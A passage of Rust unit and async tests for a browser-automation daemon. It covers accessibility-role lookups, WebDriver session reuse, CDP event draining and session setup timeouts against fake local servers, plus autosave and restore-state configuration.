    let (backend_id, actual_name) = find_ax_node_by_role(&nodes, "link", Some("Services"), true)
        .expect("lookup should continue past matching virtual AX nodes");
    assert_eq!(backend_id, 42);
    assert_eq!(actual_name, "Services");
}

#[test]
fn find_ax_node_by_role_name_miss_lists_names_seen() {
    let nodes = vec![
        ax_node("heading", "Skills", Some(43), false),
        ax_node("heading", "Experience", Some(44), false),
    ];

    let err = find_ax_node_by_role(&nodes, "heading", Some("Nope"), false)
        .expect_err("no node should match an unrelated name");
    assert!(err.contains("2 elements have role \"heading\""));
    assert!(err.contains("Nope"));
    assert!(err.contains("\"Skills\""));
    assert!(err.contains("\"Experience\""));
}

#[test]
fn find_ax_node_by_role_name_miss_count_is_elements_not_unique_names() {
    let nodes = vec![
        ax_node("heading", "Skills", Some(43), false),
        ax_node("heading", "Skills", Some(44), false),
        ax_node("heading", "Skills", Some(45), false),
    ];

    let err = find_ax_node_by_role(&nodes, "heading", Some("Nope"), false)
        .expect_err("no node should match an unrelated name");
    // 3 elements share the same name, so names_seen dedupes to 1 entry;
    // the element count must still say 3, not 1.
    assert!(
        err.contains("3 elements have role \"heading\""),
        "expected element count 3, got: {err}"
    );
    assert_eq!(
        err.matches("\"Skills\"").count(),
        1,
        "names_seen must dedupe the display list: {err}"
    );
}

#[test]
fn find_ax_node_by_role_no_role_match_reports_role_selector() {
    let nodes = vec![ax_node("button", "Submit", Some(7), false)];

    let err = find_ax_node_by_role(&nodes, "heading", Some("Nope"), false)
        .expect_err("no node has this role at all");
    assert!(err.contains("getByRole('heading'"));
    assert!(err.contains("Nope"));
}

#[test]
fn presentational_roles_are_detected_case_insensitively() {
    assert!(is_presentational_role("none"));
    assert!(is_presentational_role("presentation"));
    assert!(is_presentational_role("None"));
    assert!(is_presentational_role("PRESENTATION"));
    assert!(!is_presentational_role("heading"));
    assert!(!is_presentational_role("generic"));
}

/// Chrome prunes role="none"/"presentation" elements from the AX tree
/// (divs, uls, imgs vanish; tables survive only as ignored nodes), so
/// these queries must resolve through the DOM-attribute fallback, not
/// `find_ax_node_by_role`. Regression test for the review finding on
/// #1552: the AX rewrite broke `find role none` / `find role
/// presentation`, which the old CSS path matched.
#[tokio::test]
#[ignore]
async fn e2e_presentational_roles_resolve_through_dom_fallback() {
    let mut state = DaemonState::new();
    let resp = execute_command(
        &json!({ "id": "1", "action": "launch", "headless": true }),
        &mut state,
    )
    .await;
    assert!(resp.get("success").and_then(|v| v.as_bool()) == Some(true));

    let resp = execute_command(
            &json!({
                "id": "2",
                "action": "navigate",
                "url": "data:text/html,<div role='none'>alpha</div><div role='presentation'>beta</div><h2>gamma</h2>"
            }),
            &mut state,
        )
        .await;
    assert!(resp.get("success").and_then(|v| v.as_bool()) == Some(true));

    for (role, expected) in [
        ("none", "alpha"),
        ("presentation", "beta"),
        ("heading", "gamma"),
    ] {
        let resp = execute_command(
            &json!({ "id": "3", "action": "getbyrole", "role": role, "subaction": "text" }),
            &mut state,
        )
        .await;
        assert!(
            resp.get("success").and_then(|v| v.as_bool()) == Some(true),
            "find role {role} text must succeed: {resp}"
        );
        let text = resp
            .get("data")
            .and_then(|d| d.get("text"))
            .and_then(|t| t.as_str())
            .unwrap_or("");
        assert_eq!(text, expected, "find role {role} text");
    }

    let _ = execute_command(&json!({ "id": "99", "action": "close" }), &mut state).await;
}

async fn start_webdriver_response_server(
    responses: Vec<(&'static str, Value)>,
) -> (u16, tokio::task::JoinHandle<usize>) {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let handle = tokio::spawn(async move {
        let mut handled = 0;
        for (expected_path, body) in responses {
            let (mut stream, _) = listener.accept().await.unwrap();
            let mut buf = [0_u8; 2048];
            let n = stream.read(&mut buf).await.unwrap_or(0);
            let request = String::from_utf8_lossy(&buf[..n]);
            let (method, path) = expected_path
                .split_once(' ')
                .unwrap_or(("GET", expected_path));
            assert!(request.starts_with(&format!("{} {} ", method, path)));
            let body = body.to_string();
            let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
            stream.write_all(response.as_bytes()).await.unwrap();
            handled += 1;
        }
        handled
    });
    (port, handle)
}

fn safari_settings() -> crate::session_settings::Running {
    let mut settings = crate::session_settings::Running::default();
    settings.set(Key::Provider, json!("safari"));
    settings.set(Key::Headed, json!(false));
    settings
}

#[tokio::test]
async fn ordinary_commands_keep_the_active_webdriver_session() {
    let guard = EnvGuard::new(&["FROB_EXECUTABLE_PATH", "FROB_PROVIDER"]);
    guard.set("FROB_EXECUTABLE_PATH", "/missing/chrome-for-test");
    guard.remove("FROB_PROVIDER");
    let (port, server) = start_webdriver_response_server(vec![
        (
            "/session/test-session/url",
            json!({ "value": "https://example.test/first" }),
        ),
        (
            "/session/test-session/url",
            json!({ "value": "https://example.test/first" }),
        ),
    ])
    .await;
    let mut state = DaemonState::new();
    state.backend_type = BackendType::WebDriver;
    state.webdriver_backend = Some(WebDriverBackend::new(
        crate::native::webdriver::client::WebDriverClient::new_with_session(
            port,
            "test-session".to_string(),
        ),
    ));
    state.settings = safari_settings();

    for _ in 0..2 {
        let response = execute_command(
            &json!({ "id": "url", "action": "url", "provider": "safari" }),
            &mut state,
        )
        .await;
        assert_eq!(response["success"], true);
        assert_eq!(response["data"]["url"], "https://example.test/first");
        assert!(state.browser.is_none());
        assert!(state.webdriver_backend.is_some());
    }

    assert_eq!(server.await.unwrap(), 2);
}

#[tokio::test]
#[cfg_attr(
    target_os = "macos",
    ignore = "replacement launch starts the real safaridriver"
)]
async fn webdriver_launch_reuses_matching_config_and_closes_before_replacement() {
    let vars = &[
        "FROB_ENGINE",
        "FROB_EXECUTABLE_PATH",
        "FROB_PROXY_USERNAME",
        "FROB_PROXY_PASSWORD",
        "FROB_HEADED",
        "FROB_ENABLE",
        "FROB_INIT_SCRIPTS",
        "FROB_ALLOWED_DOMAINS",
        "FROB_HIDE_SCROLLBARS",
        "FROB_WEBGPU",
        "FROB_NO_XVFB",
        "FROB_NO_WEBMCP",
    ];
    let guard = EnvGuard::new(vars);
    for name in vars {
        guard.remove(name);
    }
    for changed_config in [false, true] {
        let mut cmd =
            json!({ "action": "launch", "provider": "safari", "port": 0, "headless": true });
        let invalid_session =
            json!({ "value": { "error": "invalid session id", "message": "Session has ended" } });
        let mut responses = vec![(
            "/session/test-session/window/handles",
            json!({ "value": ["window-1"] }),
        )];
        if !changed_config {
            responses.push((
                "/session/test-session/window/handles",
                invalid_session.clone(),
            ));
        }
        responses.push(("DELETE /session/test-session", invalid_session));
        let (port, server) = start_webdriver_response_server(responses).await;
        let mut state = DaemonState::new();
        state.backend_type = BackendType::WebDriver;
        state.webdriver_backend = Some(WebDriverBackend::new(
            crate::native::webdriver::client::WebDriverClient::new_with_session(
                port,
                "test-session".to_string(),
            ),
        ));
        state.settings = safari_settings();

        let response = handle_launch_inner(&cmd, &mut state).await.unwrap();

        assert_eq!(response["reused"], true);
        assert!(state.webdriver_backend.is_some());
        if changed_config {
            cmd["ignoreHTTPSErrors"] = json!(true);
        }
        let result = handle_launch_inner(&cmd, &mut state).await;
        assert!(result.is_err());
        assert!(state.webdriver_backend.is_none());
        assert!(state.browser.is_none());
        assert_eq!(server.await.unwrap(), if changed_config { 2 } else { 3 });
    }
}

fn unique_socket_dir(label: &str) -> PathBuf {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("system clock should be after unix epoch")
        .as_nanos();
    std::env::temp_dir().join(format!("frob-{label}-{}-{nanos}", std::process::id()))
}

#[test]
fn test_iframe_network_events_are_scoped_to_active_page_sessions() {
    let active_sessions = HashSet::from(["active-iframe".to_string()]);

    assert!(is_active_iframe_network_event(
        "Network.requestWillBeSent",
        Some("active-iframe"),
        true,
        &active_sessions,
    ));
    assert!(!is_active_iframe_network_event(
        "Network.requestWillBeSent",
        Some("background-iframe"),
        true,
        &active_sessions,
    ));
    assert!(!is_active_iframe_network_event(
        "Runtime.consoleAPICalled",
        Some("active-iframe"),
        true,
        &active_sessions,
    ));
    assert!(!is_active_iframe_network_event(
        "Network.requestWillBeSent",
        Some("active-iframe"),
        false,
        &active_sessions,
    ));
}

#[test]
fn test_active_frame_scope_tracks_top_level_and_iframe_changes() {
    assert!(!active_frame_scope_may_have_changed(
        &DrainedEvents::default()
    ));

    let mut destroyed_page = DrainedEvents::default();
    destroyed_page
        .destroyed_targets
        .push("page-target".to_string());
    assert!(active_frame_scope_may_have_changed(&destroyed_page));

    let mut attached_iframe = DrainedEvents::default();
    attached_iframe
        .attached_iframe_sessions
        .push(("frame".to_string(), "session".to_string()));
    assert!(active_frame_scope_may_have_changed(&attached_iframe));
}

#[test]
fn drain_drops_targets_destroyed_in_the_same_batch() {
    let mut state = DaemonState::new();
    let (events, receiver) = broadcast::channel(16);
    state.event_rx = Some(receiver);

    events
            .send(CdpEvent {
                method: "Target.targetInfoChanged".to_string(),
                params: json!({"targetInfo":{"targetId":"closed","type":"page","title":"","url":"https://example.com/","attached":false}}),
                session_id: None,
            })
            .unwrap();
    events
        .send(CdpEvent {
            method: "Target.targetDestroyed".to_string(),
            params: json!({"targetId":"closed"}),
            session_id: None,
        })
        .unwrap();

    let drained = state.drain_cdp_events();
    assert!(drained.new_targets.is_empty());
    assert_eq!(drained.destroyed_targets, vec!["closed".to_string()]);
}

#[test]
fn drain_drops_sessions_detached_in_the_same_batch() {
    let mut state = DaemonState::new();
    let (events, receiver) = broadcast::channel(16);
    state.event_rx = Some(receiver);

    events
            .send(CdpEvent {
                method: "Target.attachedToTarget".to_string(),
                params: json!({"sessionId":"old","targetInfo":{"targetId":"w","type":"service_worker","title":"","url":"https://example.com/sw.js","attached":true},"waitingForDebugger":true}),
                session_id: None,
            })
            .unwrap();
    events
        .send(CdpEvent {
            method: "Target.detachedFromTarget".to_string(),
            params: json!({"sessionId":"old","targetId":"w"}),
            session_id: None,
        })
        .unwrap();
    events
            .send(CdpEvent {
                method: "Target.attachedToTarget".to_string(),
                params: json!({"sessionId":"new","targetInfo":{"targetId":"w","type":"service_worker","title":"","url":"https://example.com/sw.js","attached":true},"waitingForDebugger":true}),
                session_id: None,
            })
            .unwrap();

    let drained = state.drain_cdp_events();
    assert_eq!(drained.attached_worker_sessions.len(), 1);
    assert_eq!(drained.attached_worker_sessions[0].1, "new");
}

#[test]
fn drain_keeps_discovered_page_when_its_session_detaches() {
    let mut state = DaemonState::new();
    let (events, receiver) = broadcast::channel(16);
    state.event_rx = Some(receiver);

    events
            .send(CdpEvent {
                method: "Target.targetInfoChanged".to_string(),
                params: json!({"targetInfo":{"targetId":"p","type":"page","title":"","url":"https://example.com/","attached":false}}),
                session_id: None,
            })
            .unwrap();
    events
            .send(CdpEvent {
                method: "Target.attachedToTarget".to_string(),
                params: json!({"sessionId":"old","targetInfo":{"targetId":"p","type":"page","title":"","url":"https://example.com/","attached":true},"waitingForDebugger":true}),
                session_id: None,
            })
            .unwrap();
    events
        .send(CdpEvent {
            method: "Target.detachedFromTarget".to_string(),
            params: json!({"sessionId":"old","targetId":"p"}),
            session_id: None,
        })
        .unwrap();

    let drained = state.drain_cdp_events();
    assert!(drained.attached_page_sessions.is_empty());
    assert_eq!(drained.new_targets.len(), 1);
    assert_eq!(drained.new_targets[0].target_info.target_id, "p");
}

/// An iframe that detaches while its session is being prepared is
/// dropped without waiting out the CDP timeout and without closing the
/// browser, even with network controls active (#1991). Frames that were
/// already attached, and ones attached in the same batch, are kept.
#[tokio::test]
async fn iframe_detached_during_setup_is_dropped_without_stalling() {
    use futures_util::{SinkExt, StreamExt};
    use tokio_tungstenite::tungstenite::Message;

    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("ws://{}", listener.local_addr().unwrap());
    let resumed = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let resumed_by_server = resumed.clone();
    tokio::spawn(async move {
        let (stream, _) = listener.accept().await.unwrap();
        let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
        while let Some(Ok(Message::Text(text))) = ws.next().await {
            let command: Value = serde_json::from_str(&text).unwrap();
            let session = command["sessionId"].as_str().unwrap_or_default();
            if command["method"] == "Runtime.runIfWaitingForDebugger" {
                resumed_by_server.lock().unwrap().push(session.to_string());
                continue;
            }
            // The short-lived frame is gone before Chrome answers.
            let reply = if session == "S-GONE" {
                json!({
                    "method": "Target.detachedFromTarget",
                    "params": { "sessionId": "S-GONE", "targetId": "F-GONE" }
                })
            } else {
                json!({ "id": command["id"], "result": {} })
            };
            if ws.send(Message::Text(reply.to_string())).await.is_err() {
                return;
            }
        }
    });

    let mut state = DaemonState::new();
    let client = CdpClient::connect(&url).await.unwrap();
    state.browser = Some(BrowserManager::for_test(client, url.clone()));
    *state.proxy_credentials.write().await = Some(("user".into(), "pass".into()));
    state
        .iframe_sessions
        .insert("F-PAY".to_string(), "S-PAY".to_string());

    let drained = DrainedEvents {
        attached_iframe_sessions: vec![
            ("F-GONE".to_string(), "S-GONE".to_string()),
            ("F-NEW".to_string(), "S-NEW".to_string()),
        ],
        ..DrainedEvents::default()
    };
    tokio::time::timeout(
        std::time::Duration::from_secs(2),
        state.apply_drained_events(drained),
    )
    .await
    .expect("a detached iframe must not hold up the drain")
    .unwrap();

    assert!(state.browser.is_some(), "the browser must stay open");
    assert_eq!(
        state.iframe_sessions,
        HashMap::from([
            ("F-PAY".to_string(), "S-PAY".to_string()),
            ("F-NEW".to_string(), "S-NEW".to_string()),
        ])
    );
    tokio::time::timeout(std::time::Duration::from_secs(2), async {
        while !resumed.lock().unwrap().contains(&"S-NEW".to_string()) {
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
    })
    .await
    .expect("the live frame should be resumed");
    assert!(!resumed.lock().unwrap().contains(&"S-GONE".to_string()));
}

fn setup_test_target(target_id: &str, target_type: &str) -> TargetInfo {
    TargetInfo {
        target_id: target_id.to_string(),
        target_type: target_type.to_string(),
        title: String::new(),
        url: "https://example.com/".to_string(),
        attached: Some(true),
        browser_context_id: None,
    }
}

/// Fake CDP endpoint for the session setup tests. `Target.attachToTarget`
/// attaches `attach_sid`. Commands to `S-GONE` are answered with that
/// session's detach, commands to `S-SILENT` are never answered,
/// `Runtime.evaluate` in `S-THROWS` reports an exception whose text names
/// a missing session, and everything else succeeds. Returns the URL and
/// the sessions resumed.
async fn spawn_session_setup_cdp_server(
    attach_sid: &'static str,
) -> (String, Arc<std::sync::Mutex<Vec<String>>>) {
    use futures_util::{SinkExt, StreamExt};
    use tokio_tungstenite::tungstenite::Message;

    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("ws://{}", listener.local_addr().unwrap());
    let resumed = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let resumed_by_server = resumed.clone();
    tokio::spawn(async move {
        let (stream, _) = listener.accept().await.unwrap();
        let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
        while let Some(Ok(Message::Text(text))) = ws.next().await {
            let command: Value = serde_json::from_str(&text).unwrap();
            let session = command["sessionId"].as_str().unwrap_or_default();
            if command["method"] == "Runtime.runIfWaitingForDebugger" {
                resumed_by_server.lock().unwrap().push(session.to_string());
                continue;
            }
            let reply = match session {
                "S-SILENT" => continue,
                "S-THROWS" if command["method"] == "Runtime.evaluate" => json!({
                    "id": command["id"],
                    "result": {
                        "result": { "type": "object", "subtype": "error" },
                        "exceptionDetails": {
                            "text": "Uncaught",
                            "exception": {
                                "type": "object",
                                "subtype": "error",
                                "description": "Error: Session with given id not found."
                            }
                        }
                    }
                }),
                "S-GONE" => json!({
                    "method": "Target.detachedFromTarget",
                    "params": { "sessionId": "S-GONE", "targetId": "T-GONE" }
                }),
                _ if command["method"] == "Target.attachToTarget" => json!({
                    "id": command["id"],
                    "result": { "sessionId": attach_sid }
                }),
                _ => json!({ "id": command["id"], "result": {} }),
            };
            if ws.send(Message::Text(reply.to_string())).await.is_err() {
                return;
            }
        }
    });
    (url, resumed)
}

/// A popup page or worker that detaches while the drain prepares it is
/// dropped without closing the browser, even though network controls are
/// active. Covers every page and worker path of the drain.
#[tokio::test]
async fn page_or_worker_detached_during_setup_keeps_the_browser_open() {
    let cases: Vec<(&str, DrainedEvents)> = vec![
        (
            "attached page",
            DrainedEvents {
                attached_page_sessions: vec![(
                    setup_test_target("T-GONE", "page"),
                    "S-GONE".to_string(),
                )],
                ..DrainedEvents::default()
            },
        ),
        (
            "discovered page",
            DrainedEvents {
                new_targets: vec![TargetCreatedEvent {
                    target_info: setup_test_target("T-GONE", "page"),
                }],
                ..DrainedEvents::default()
            },
        ),
        (
            "worker",
            DrainedEvents {
                attached_worker_sessions: vec![(
                    setup_test_target("T-GONE", "service_worker"),
                    "S-GONE".to_string(),
                )],
                ..DrainedEvents::default()
            },
        ),
    ];

    for (name, drained) in cases {
        let (url, resumed) = spawn_session_setup_cdp_server("S-GONE").await;
        let mut state = DaemonState::new();
        let client = CdpClient::connect(&url).await.unwrap();
        state.browser = Some(BrowserManager::for_test(client, url.clone()));
        *state.proxy_credentials.write().await = Some(("user".into(), "pass".into()));

        let result = tokio::time::timeout(
            std::time::Duration::from_secs(2),
            state.apply_drained_events(drained),
        )
        .await
        .unwrap_or_else(|_| panic!("{name}: a detached session must not hold up the drain"));

        assert_eq!(result, Ok(()), "{name}");
        assert!(
            state.browser.is_some(),
            "{name}: the browser must stay open"
        );
        assert!(
            !resumed.lock().unwrap().contains(&"S-GONE".to_string()),
            "{name}: a detached session is not resumed"
        );
    }
}

/// Every child session the drain prepares is bounded, so one that never
/// answers and never reports a detach holds the drain (and with it every
/// queued command) for the setup bound, not the 30 s CDP timeout of each
/// command it sends.
#[tokio::test]
async fn silent_session_setup_is_bounded() {
    let cases: Vec<(&str, DrainedEvents)> = vec![
        (
            "iframe",
            DrainedEvents {
                attached_iframe_sessions: vec![("F-SILENT".to_string(), "S-SILENT".to_string())],
                ..DrainedEvents::default()
            },
        ),
        (
            "attached page",
            DrainedEvents {
                attached_page_sessions: vec![(
                    setup_test_target("T-SILENT", "page"),
                    "S-SILENT".to_string(),
                )],
                ..DrainedEvents::default()
            },
        ),
        (
            "discovered page",
            DrainedEvents {
                new_targets: vec![TargetCreatedEvent {
                    target_info: setup_test_target("T-SILENT", "page"),
                }],
                ..DrainedEvents::default()
            },
        ),
    ];

    for (name, drained) in cases {
        let (url, _) = spawn_session_setup_cdp_server("S-SILENT").await;
        let mut state = DaemonState::new();
        let client = CdpClient::connect(&url).await.unwrap();
        state.browser = Some(BrowserManager::for_test(client, url.clone()));

        // Virtual time: the clock jumps to the next timer once the
        // runtime is idle, so the bound fires without a 10 s wait.
        tokio::time::pause();
        let started = tokio::time::Instant::now();
        let result = tokio::time::timeout(
            AUTO_ATTACHED_SETUP_TIMEOUT * 2,
            state.apply_drained_events(drained),
        )
        .await
        .unwrap_or_else(|_| panic!("{name}: setup must give up at the setup bound"));
        let elapsed = started.elapsed();
        tokio::time::resume();

        // Without network controls a failed setup is only a warning.
        assert_eq!(result, Ok(()), "{name}");
        assert!(state.browser.is_some(), "{name}");
        assert!(
            elapsed >= AUTO_ATTACHED_SETUP_TIMEOUT,
            "{name}: gave up after {elapsed:?}"
        );
    }
}

/// The background handler drops a session that detaches while it
/// installs network controls, and resumes the ones that stay attached.
#[tokio::test]
async fn background_auto_attach_drops_sessions_detached_during_setup() {
    let (url, resumed) = spawn_session_setup_cdp_server("S-GONE").await;
    let client = CdpClient::connect(&url).await.unwrap();

    for target_type in ["iframe", "page", "service_worker"] {
        for (sid, target_id, expected) in [
            ("S-LIVE", "T-LIVE", AutoAttachedSetup::Resumed),
            ("S-GONE", "T-GONE", AutoAttachedSetup::Detached),
        ] {
            let target = setup_test_target(target_id, target_type);
            let outcome = tokio::time::timeout(
                std::time::Duration::from_secs(2),
                setup_auto_attached_session(&client, sid, Some(&target), true, None, true),
            )
            .await
            .unwrap_or_else(|_| panic!("{target_type} {sid}: setup must not stall"));
            assert_eq!(outcome, expected, "{target_type} {sid}");
        }
    }

    tokio::time::timeout(std::time::Duration::from_secs(2), async {
        while resumed.lock().unwrap().len() < 3 {
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
    })
    .await
    .expect("each live session should be resumed");
    let resumed = resumed.lock().unwrap();
    assert!(resumed.iter().all(|sid| sid == "S-LIVE"), "{resumed:?}");
}

/// A live frame or page can throw from the injected domain filter with
/// any message, including Chrome's text for a missing session. That is a
/// failure to install the filter, not a detach, so the browser still
/// closes instead of leaving the target running without its controls.
#[tokio::test]
async fn page_thrown_detach_text_still_fails_network_controls_closed() {
    let cases: Vec<(&str, DrainedEvents)> = vec![
        (
            "iframe",
            DrainedEvents {
                attached_iframe_sessions: vec![("F-THROWS".to_string(), "S-THROWS".to_string())],
                ..DrainedEvents::default()
            },
        ),
        (
            "attached page",
            DrainedEvents {
                attached_page_sessions: vec![(
                    setup_test_target("T-THROWS", "page"),
                    "S-THROWS".to_string(),
                )],
                ..DrainedEvents::default()
            },
        ),
    ];

    for (name, drained) in cases {
        let (url, resumed) = spawn_session_setup_cdp_server("S-THROWS").await;
        let mut state = DaemonState::new();
        let client = CdpClient::connect(&url).await.unwrap();
        state.browser = Some(BrowserManager::for_test(client, url.clone()));
        *state.domain_filter.write().await = Some(DomainFilter::new("example.com"));

        let result = tokio::time::timeout(
            std::time::Duration::from_secs(2),
            state.apply_drained_events(drained),
        )
        .await
        .unwrap_or_else(|_| panic!("{name}: setup must not stall"));

        let error = result.expect_err(name);
        assert!(
            error.starts_with("Failed to install browser network controls"),
            "{name}: {error}"
        );
        assert!(state.browser.is_none(), "{name}: the browser must close");
        assert!(
            !resumed.lock().unwrap().contains(&"S-THROWS".to_string()),
            "{name}: an uncontrolled target is not resumed"
        );
    }

    let (url, resumed) = spawn_session_setup_cdp_server("S-THROWS").await;
    let client = CdpClient::connect(&url).await.unwrap();
    let filter = DomainFilter::new("example.com");
    for target_type in ["iframe", "page"] {
        let target = setup_test_target("T-THROWS", target_type);
        let outcome = tokio::time::timeout(
            std::time::Duration::from_secs(2),
            setup_auto_attached_session(
                &client,
                "S-THROWS",
                Some(&target),
                false,
                Some(&filter),
                false,
            ),
        )
        .await
        .unwrap_or_else(|_| panic!("auto-attached {target_type}: setup must not stall"));
        assert_eq!(
            outcome,
            AutoAttachedSetup::Failed,
            "auto-attached {target_type}"
        );
    }
    assert!(resumed.lock().unwrap().is_empty());
}

#[test]
fn test_restore_validation_is_deferred_after_launch() {
    assert!(!should_validate_restore_after_action("launch"));
    assert!(should_validate_restore_after_action("navigate"));
    assert!(should_validate_restore_after_action("click"));
}

#[test]
fn test_autosave_due_requires_interval() {
    let state = DaemonState::new();
    assert!(
        autosave_due(&state, 30_000),
        "idle sessions stay eligible so page-driven mutations get saved"
    );
    assert!(!autosave_due(&state, 0), "interval 0 disables autosave");
}

#[test]
fn test_autosave_waits_for_quiet_period_after_command() {
    let mut state = DaemonState::new();

    state.last_command_finished = Some(std::time::Instant::now());
    assert!(!autosave_due(&state, 30_000));

    state.last_command_finished = std::time::Instant::now().checked_sub(
        std::time::Duration::from_millis(AUTOSAVE_QUIET_PERIOD_MS + 1_000),
    );
    assert!(state.last_command_finished.is_some());
    assert!(autosave_due(&state, 30_000));
}

#[test]
fn test_autosave_enforces_min_interval_between_attempts() {
    let mut state = DaemonState::new();

    state.last_autosave_attempt = Some(std::time::Instant::now());
    assert!(!autosave_due(&state, 30_000));

    state.last_autosave_attempt =
        std::time::Instant::now().checked_sub(std::time::Duration::from_secs(31));
    assert!(state.last_autosave_attempt.is_some());
    assert!(autosave_due(&state, 30_000));
}

#[test]
fn test_autosave_blocked_while_dialog_open() {
    let mut state = DaemonState::new();
    state.pending_dialog = Some(PendingDialog {
        dialog_type: "confirm".to_string(),
        message: "Are you sure?".to_string(),
        url: "https://example.com".to_string(),
        default_prompt: None,
        session_id: None,
    });
    assert!(!autosave_due(&state, 30_000));
}

#[tokio::test]
async fn test_autosave_skips_sessions_it_can_never_apply_to() {
    // No restore key: the tick is a no-op.
    let mut state = DaemonState::new();
    state.session_name = None;
    maybe_autosave_restore_state(&mut state, 30_000).await;
    assert!(state.last_autosave_attempt.is_none());
    assert_eq!(state.restore_save_status, "not_attempted");

    // Saving disabled by policy: same treatment.
    let mut state = DaemonState::new();
    state.session_name = Some("my-session".to_string());
    state.restore_save = "never".to_string();
    maybe_autosave_restore_state(&mut state, 30_000).await;
    assert!(state.last_autosave_attempt.is_none());
    assert_eq!(state.restore_save_status, "not_attempted");
}

#[tokio::test]
async fn test_autosave_skips_without_browser() {
    let mut state = DaemonState::new();
    state.session_name = Some("my-session".to_string());
    state.restore_save = "auto".to_string();
    maybe_autosave_restore_state(&mut state, 30_000).await;
    assert!(state.last_autosave_attempt.is_none());
    assert_eq!(state.restore_save_status, "not_attempted");
}

#[test]
fn test_restore_key_change_resets_runtime_restore_state() {
    let mut state = DaemonState::new();
    state.session_name = Some("old-key".to_string());
    state.restore_status = "loaded_but_invalid".to_string();
    state.restore_status_detail = Some("missing text".to_string());
    state.restore_loaded_path = Some("/tmp/old-key.json".to_string());
    state.restore_load_failed = true;
    state.restore_validation_pending = true;
    state.restore_save_status = "skipped_restore_failed".to_string();
    state.restore_saved_path = Some("/tmp/old-key.json".to_string());

    apply_restore_config_from_command(&json!({ "restoreKey": "new-key" }), &mut state).unwrap();

    assert_eq!(state.session_name.as_deref(), Some("new-key"));
    assert_eq!(state.restore_status, "pending");
    assert!(state.restore_status_detail.is_none());
    assert!(state.restore_loaded_path.is_none());
    assert!(!state.restore_load_failed);
    assert!(!state.restore_validation_pending);
    assert_eq!(state.restore_save_status, "not_attempted");
    assert!(state.restore_saved_path.is_none());
}

#[test]
fn test_restore_key_same_value_preserves_failure_state() {
    let mut state = DaemonState::new();
    state.session_name = Some("same-key".to_string());
    state.restore_status = "loaded_but_invalid".to_string();
    state.restore_load_failed = true;
    state.restore_save_status = "skipped_restore_failed".to_string();

    apply_restore_config_from_command(&json!({ "restoreKey": "same-key" }), &mut state).unwrap();

    assert_eq!(state.session_name.as_deref(), Some("same-key"));
    assert_eq!(state.restore_status, "loaded_but_invalid");
    assert!(state.restore_load_failed);
    assert_eq!(state.restore_save_status, "skipped_restore_failed");
}

#[test]
fn test_restore_config_command_clears_sticky_checks_and_policy() {
    let mut state = DaemonState::new();
    state.session_name = Some("same-key".to_string());
    state.restore_save = "never".to_string();
    state.restore_check_text = Some("Dashboard".to_string());
    state.restore_status = "loaded_but_invalid".to_string();
    state.restore_status_detail = Some("missing text".to_string());
    state.restore_load_failed = true;

    apply_restore_config_from_command(
        &json!({
            "restoreKey": "same-key",
            "restoreSave": "auto",
            "restoreCheckUrl": null,
            "restoreCheckText": null,
            "restoreCheckFn": null
        }),
        &mut state,
    )
    .unwrap();

    assert_eq!(state.restore_save, "auto");
    assert!(state.restore_check_url.is_none());
    assert!(state.restore_check_text.is_none());
    assert!(state.restore_check_fn.is_none());
    assert_eq!(state.restore_status, "loaded");
    assert!(state.restore_status_detail.is_none());
    assert!(!state.restore_load_failed);
    assert!(!state.restore_validation_pending);
}

#[test]
fn test_restore_config_check_change_marks_loaded_state_for_validation() {
    let mut state = DaemonState::new();
    state.session_name = Some("same-key".to_string());
    state.restore_status = "loaded".to_string();
    state.restore_load_failed = false;
    state.restore_validation_pending = false;

    apply_restore_config_from_command(
        &json!({
            "restoreKey": "same-key",
            "restoreCheckText": "Dashboard"
        }),
        &mut state,
    )
    .unwrap();

    assert_eq!(state.restore_check_text.as_deref(), Some("Dashboard"));
    assert_eq!(state.restore_status, "loaded");
    assert!(!state.restore_load_failed);
    assert!(state.restore_validation_pending);
}

#[test]
fn test_restore_config_rejects_invalid_restore_key() {
    let mut state = DaemonState::new();

    let err = apply_restore_config_from_command(&json!({ "restoreKey": "../bad" }), &mut state)
        .unwrap_err();

    assert!(err.contains("Invalid session name"));
    assert!(state.session_name.is_none());
    assert_eq!(state.restore_status, "not_configured");
}

#[test]
fn test_restore_config_rejects_invalid_save_policy() {
    let mut state = DaemonState::new();

    let err = apply_restore_config_from_command(
        &json!({
            "restoreKey": "same-key",
            "restoreSave": "sometimes"
        }),
        &mut state,
    )
    .unwrap_err();

    assert!(err.contains("Invalid restore save policy"));
    assert!(state.session_name.is_none());
    assert_eq!(state.restore_save, "auto");
}

#[test]
fn test_explicit_state_load_clears_restore_failure_for_auto_save() {
    let mut state = DaemonState::new();
    state.session_name = Some("restore-key".to_string());
    state.restore_status = "loaded_but_invalid".to_string();
    state.restore_status_detail = Some("missing text".to_string());
    state.restore_loaded_path = Some("/tmp/old-restore.json".to_string());
    state.restore_load_failed = true;
    state.restore_validation_pending = true;
    state.restore_save_status = "skipped_restore_failed".to_string();
    state.restore_saved_path = Some("/tmp/old-restore.json".to_string());

    mark_explicit_storage_state_loaded(&mut state, "/tmp/my-auth.json");

    assert_eq!(state.restore_status, "loaded");
    assert!(state.restore_status_detail.is_none());
    assert_eq!(
        state.restore_loaded_path.as_deref(),
        Some("/tmp/my-auth.json")
    );
    assert!(!state.restore_load_failed);
    assert!(!state.restore_validation_pending);
    assert_eq!(state.restore_save_status, "not_attempted");
    assert!(state.restore_saved_path.is_none());
}

#[test]
fn test_explicit_state_load_without_restore_keeps_restore_unconfigured() {
    let mut state = DaemonState::new();

    mark_explicit_storage_state_loaded(&mut state, "/tmp/my-auth.json");

    assert_eq!(state.restore_status, "not_configured");
    assert!(state.restore_loaded_path.is_none());
    assert!(!state.restore_load_failed);
    assert_eq!(state.restore_save_status, "not_attempted");
}

#[test]
fn test_policy_actions_use_command_plugins_for_auto_launch_mutators() {
